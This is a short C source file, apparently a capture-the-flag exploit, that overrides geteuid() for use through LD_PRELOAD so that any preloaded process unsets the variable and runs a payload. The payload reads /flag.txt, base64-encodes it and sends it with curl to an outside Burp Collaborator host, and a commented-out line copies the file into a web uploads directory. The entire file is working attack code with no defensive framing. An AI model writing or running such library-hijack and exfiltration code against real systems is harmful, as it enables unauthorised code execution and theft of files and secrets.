#include <stdlib.h>
#include <stdio.h>
#include <string.h>

void payload() {
	system("curl https://awathv415xqaouykn3znv3ml0c62ur.burpcollaborator.net/flag?flag=$(cat /flag.txt | base64)");
	// system("cat /flag.txt> /var/www/html/uploads/flag_for_nhienit.txt");
}   

int  geteuid() {
	if (getenv("LD_PRELOAD") == NULL) { return 0; }
	unsetenv("LD_PRELOAD");
	payload();
}
